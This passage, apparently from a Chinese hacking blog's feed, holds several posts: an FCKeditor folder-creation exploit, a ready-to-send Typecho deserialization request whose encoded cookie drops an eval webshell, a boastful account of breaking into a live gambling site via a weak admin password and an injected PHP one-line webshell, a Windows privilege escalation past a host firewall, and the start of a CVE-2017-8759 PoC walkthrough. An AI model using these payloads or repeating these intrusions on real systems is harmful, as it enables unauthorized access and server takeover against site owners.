FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=/ice.asp&amp;NewFolderName=x.asp</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/26.png" alt="毫无技术含量的一次渗透"></p><p>成功建立了<br>亮出我们的一句话</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/27.png" alt="毫无技术含量的一次渗透"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/28.png" alt="毫无技术含量的一次渗透"><br>上传成功，查看下文件</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/29.png" alt="毫无技术含量的一次渗透"><br>构造下路径访问</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/30.png" alt="毫无技术含量的一次渗透"><br>来啊，互相伤害啊</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/31.png" alt="毫无技术含量的一次渗透"></p><p>突然想到，这种站怎么可能会有妹子资料，算了算了，提不起兴趣了。删马走人…….<br>此文没有任何技术含量。只是双十一屌丝蛋疼打发时间而已！！勿喷</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typecho install.php 反序列化导致任意代码执行</title>
    <link href="/p/19b8a02a.html"/>
    <url>/p/19b8a02a.html</url>
    
    <content type="html"><![CDATA[<h1 id="什么是Typecho？"><a href="#什么是Typecho？" class="headerlink" title="什么是Typecho？"></a>什么是Typecho？</h1><p>Typecho 是一款博客程序，它在 GPL version 2 许可证下发行，基于 PHP (需要 PHP5 以上版本)构建,可以运行在各种平台上，支持多种数据库(Mysql, PostgreSQL, SQLite)，在国内使用较广。</p><h1 id="影响的版本"><a href="#影响的版本" class="headerlink" title="影响的版本"></a>影响的版本</h1><p>GitHub上2017年10月24日之前的所以版本。</p><a id="more"></a><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /typecho/install.php?finish=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.127</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">12</span>; rv:<span class="hljs-number">55</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">55</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Cookie</span>: __typecho_config=YToyOntzOjc<span class="hljs-number">6</span>ImFkYXB<span class="hljs-number">0</span>ZXIiO<span class="hljs-number">086</span>MTI<span class="hljs-number">6</span>IlR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZCI<span class="hljs-number">6</span>NDp<span class="hljs-number">7</span>czoxOToiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfdHlwZSI<span class="hljs-number">7</span>czo<span class="hljs-number">4</span>OiJBVE<span class="hljs-number">9</span>NIDEuMCI<span class="hljs-number">7</span>czoyMjoiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfY<span class="hljs-number">2</span>hhcnNldCI<span class="hljs-number">7</span>czo<span class="hljs-number">1</span>OiJVVEYtOCI<span class="hljs-number">7</span>czoxOToiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfbGFuZyI<span class="hljs-number">7</span>czoyOiJ<span class="hljs-number">6</span>aCI<span class="hljs-number">7</span>czoyMDoiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfaXRlbXMiO<span class="hljs-number">2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>aTowO<span class="hljs-number">2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>czo<span class="hljs-number">2</span>OiJhdXRob<span class="hljs-number">3</span>IiO<span class="hljs-number">086</span>MTU<span class="hljs-number">6</span>IlR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fUmVxdWVzdCI<span class="hljs-number">6</span>Mjp<span class="hljs-number">7</span>czoyNDoiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fUmVxdWVzdABfcGFyYW<span class="hljs-number">1</span>zIjthOjE<span class="hljs-number">6</span>e<span class="hljs-number">3</span>M<span class="hljs-number">6</span>MTA<span class="hljs-number">6</span>InNjcmVlbk<span class="hljs-number">5</span>hbWUiO<span class="hljs-number">3</span>M<span class="hljs-number">6</span>NTc<span class="hljs-number">6</span>ImZpbGVfcHV<span class="hljs-number">0</span>X<span class="hljs-number">2</span>NvbnRlbnRzKCdwMC<span class="hljs-number">5</span>waHAnLCAnPD<span class="hljs-number">9</span>waHAgQGV<span class="hljs-number">2</span>YWwoJF<span class="hljs-number">9</span>QT<span class="hljs-number">1</span>NUW<span class="hljs-number">3</span>AwXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span>nKSI<span class="hljs-number">7</span>fXM<span class="hljs-number">6</span>MjQ<span class="hljs-number">6</span>IgBUeXBlY<span class="hljs-number">2</span>hvX<span class="hljs-number">1</span>JlcXVlc<span class="hljs-number">3</span>QAX<span class="hljs-number">2</span>ZpbHRlciI<span class="hljs-number">7</span>YToxOntpOjA<span class="hljs-number">7</span>czo<span class="hljs-number">2</span>OiJhc<span class="hljs-number">3</span>NlcnQiO<span class="hljs-number">319</span>fX<span class="hljs-number">19</span>czo<span class="hljs-number">2</span>OiJwcmVmaXgiO<span class="hljs-number">3</span>M<span class="hljs-number">6</span>NzoidHlwZWNobyI<span class="hljs-number">7</span>fQ==<span class="hljs-attribute">Referer</span>:http://<span class="hljs-number">192.168.0.127</span>/typecho/install.php<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></code></pre><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们先去typecho官网下载套源码在本地搭建个环境</p><p>搭建过程就不多说了，自己百度</p><p>搭建好后我们访问首页看看</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171024_Typecho_install.php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/01.png" alt="Typecho install.php 反序列化导致任意代码执行"></p><p>接下来我们打开burp设置好代理，访问<a href="http://192.168.0.127/typecho/install.php?finish=1">http://192.168.0.127/typecho/install.php?finish=1</a> （将ip换成自己的ip），然后把包拦截，将http协议修改成我们的payload。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171024_Typecho_install.php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/02.png" alt="Typecho install.php 反序列化导致任意代码执行"></p><p>然后放包，网站根目录下就生成了一句话马。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171024_Typecho_install.php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/03.png" alt="Typecho install.php 反序列化导致任意代码执行"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Typecho</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>陪妹子玩游戏引起的风波</title>
    <link href="/p/6c69f06.html"/>
    <url>/p/6c69f06.html</url>
    
    <content type="html"><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>十月一回家和表弟还有他女票在一起玩的时候(当然，还有我女票也一起，别问我女票哪来的)，四个人刚好可以凑一桌麻将，表弟的女朋友说叫我们一起打黑桃4，黑桃4是我们家乡的一种打法。。。。<br>然后发了我一个app，我安装以后打开一看。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/01.png" alt="陪妹子玩游戏引起的风波"><br>卧槽，XXXX四个大字出现在我眼前<br>不过此时心思并不在游戏上，这个叫XXXX的肯定有个官网吧。(事情到此结束，十月一回家电脑没带回去…..)<br>祖国的生日结束以后…..又回到了学校，打开百度搜了下这个xxxx，找到了他官网: <a href="http://xxxx.com/">http://xxxx.com/</a>。</p><h3 id="踩点"><a href="#踩点" class="headerlink" title="踩点"></a>踩点</h3><p>简单的搜集了下信息如下:<br>IP: XXX.XXX.XX.XX<br>旁站:无<br>cdn:无<br>脚本:php<br>中间件:nginx<br>框架:ThinkPHP<br>cms:vlcms</p><p>可以判断出服务器架构是:php+mysql+nginx+linux</p><h3 id="进后台"><a href="#进后台" class="headerlink" title="进后台"></a>进后台</h3><p>说到这个后台嘛…….很蛋疼，想说点啥，太丢人了，还是不说了吧！！！（知道了cms，先百度网上公开的漏洞，这里毛都没有……）<br>在url后面加上admin.php，会跳转到登录界面<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/02.png" alt="陪妹子玩游戏引起的风波"><br>测试了下弱口令(人品爆发)<br>admin   admin    失败<br>admin   123456   成功<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/03.png" alt="陪妹子玩游戏引起的风波"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>老规矩，知道cms先百度，一样，毛都没……<br>只能硬着头皮在后台翻了…..<br>这里admin用户权限已经是属于超级管理员了，权限是最高的了。<br>还有个数据库备份和用户配置<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/04.png" alt="陪妹子玩游戏引起的风波"><br>不过数据库是mysql的…..没屌用啊，此处感慨为啥不学学南方。<br>剩下的就是上传点了<br>上传点有点多，随便找了个上传点<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/05.png" alt="陪妹子玩游戏引起的风波"><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/06.png" alt="陪妹子玩游戏引起的风波"><br>先上传张正常的图片看下上传功能是否有用<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/07.png" alt="陪妹子玩游戏引起的风波"><br>看来是能正常上传的，然后直接上传php脚本，弹了个框框（以为是js验证，禁用js后还是没用）<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/08.png" alt="陪妹子玩游戏引起的风波"><br>然后各种上传绕过都试了，也是没用。</p><h3 id="高潮"><a href="#高潮" class="headerlink" title="高潮"></a>高潮</h3><p>看来上传这条路是死了，翻了翻超级管理员的访问授权，看下还有哪些功能<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/09.png" alt="陪妹子玩游戏引起的风波"><br>扩展管理？后台并没有找到这个地方，莫非是阉割版？？？（后来土豆找到了这个地方）<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/10.png" alt="陪妹子玩游戏引起的风波"><br>修改url为<a href="http://xxxx.com/admin.php?s=/Addons/index">http://xxxx.com/admin.php?s=/Addons/index</a>，然后访问<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/11.png" alt="陪妹子玩游戏引起的风波"><br>和土豆研究了下这个插件，先点击快速创建<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/12.png" alt="陪妹子玩游戏引起的风波"><br>点击预览按钮可以看到代码。。。。。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/13.png" alt="陪妹子玩游戏引起的风波"><br>竟然能看到代码？这不是脱裤子找日吗？<br>思路：打算在这里写入一句话。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/14.png" alt="陪妹子玩游戏引起的风波"><br>顺手写了个一句话，然后点击预览发现被注释了。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/15.png" alt="陪妹子玩游戏引起的风波"><br>看来是有用的，那就好办了，闭合下注释和php末端。<br>最后的代码是**/?&gt; <?php @eval($_POST["a"]);?> &lt;?php /*<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/16.png" alt="陪妹子玩游戏引起的风波"><br>Ok，这样我们的一句话就写进去了。然后点击确定<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/17.png" alt="陪妹子玩游戏引起的风波"><br>卧槽，好激动。。。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/18.png" alt="陪妹子玩游戏引起的风波"><br>可是tm的地址呢？？？不过可以肯定的是，马是写进去了。<br>然后我又创建了一个插件，这次不打算完整闭合代码。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/19.png" alt="陪妹子玩游戏引起的风波"><br>这样肯定是出错的，然后我们点击确定<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/20.png" alt="陪妹子玩游戏引起的风波"><br>没错，正如你所见，报错了。刚才创建的名叫test1。<br>然后构造下我们之前创建名为Example的路径<br>地址为: <a href="http://xxxx.com/Addons/Example/ExampleAddon.class.php">http://xxxx.com/Addons/Example/ExampleAddon.class.php</a><br>然后请出菜刀，连接看看<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/21.png" alt="陪妹子玩游戏引起的风波"><br>连接成功，成功获取shell。<br>由于服务器Linux服务器我就不去提权了。</p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>这种棋牌网站，竟然来了，怎么能不留点东西呢<br>丢个txt文件走人<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/22.png" alt="陪妹子玩游戏引起的风波"><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/23.png" alt="陪妹子玩游戏引起的风波"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次System权限下的过狗提权</title>
    <link href="/p/2978905e.html"/>
    <url>/p/2978905e.html</url>
    
    <content type="html"><![CDATA[<p>事情起因:某个朋友有个phpmyadmin的站拿不下shell。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/01.png" alt="记一次System权限下的过狗提权"></p><a id="more"></a><p>拿shell的过程就不多说了，因为是用phpstudy搭建的站点(一般采用集成包搭建的都是system权限)，所以权限挺大的</p><p>首先看了下权限</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/02.png" alt="记一次System权限下的过狗提权"></p><p>确定是system，直接net user添加帐号</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/03.png" alt="记一次System权限下的过狗提权"></p><p>然后加入到管理组</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/04.png" alt="记一次System权限下的过狗提权"></p><p>拒绝访问。。。。查看下是不是有WAF</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/05.png" alt="记一次System权限下的过狗提权"></p><p>确定已经有安全狗了….竟然帐号添加了  但是没办法加入管理组</p><p>这时候y哥对我说直接克隆用户</p><p>然后上传exp</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/06.png" alt="记一次System权限下的过狗提权"></p><p>执行下，显示克隆成功。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/07.png" alt="记一次System权限下的过狗提权"></p><p>去查看下有没有开放3389</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/08.png" alt="记一次System权限下的过狗提权"></p><p>这里并没有显示3389端口，竟然这样，我们就去查看下他改成什么端口了(不过这里基本上就可以看出端口是3390了…..)</p><p>首先用tasklist /svc查看下服务，找到这个服务对应的PID号</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/09.png" alt="记一次System权限下的过狗提权"></p><p>然后用netstat –ano查看对应的端口</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/10.png" alt="记一次System权限下的过狗提权"></p><p>可以看出端口是3390，然后我们去连接下</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/11.png" alt="记一次System权限下的过狗提权"></p><p>一连接上就自动登录QQ，屎都差点吓出来……….</p><p>以前写的一篇文章，没啥技术含量，此文只是做次笔记</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-8759漏洞复现</title>
    <link href="/p/c1a00b05.html"/>
    <url>/p/c1a00b05.html</url>
    
    <content type="html"><![CDATA[<p>漏洞介绍:<a href="http://www.freebuf.com/articles/system/147602.html">http://www.freebuf.com/articles/system/147602.html</a></p><p>贴上POC地址:<a href="https://github.com/bhdresh/CVE-2017-8759">https://github.com/bhdresh/CVE-2017-8759</a></p><p>由于kali2.0太卡，已被我抛弃，目前使用parrot系统。</p><p>先用命令将POC下载到本地</p><p><code>git clone https://github.com/bhdresh/CVE-2017-8759</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/01.png" alt="CVE-2017-8759漏洞复现"></p><a id="more"></a><p>我们进入到CVE-2017-8759这个文件夹，打开README.md文件查看下使用方法</p><p><code>sudo pluma README.md</code></p><p><img 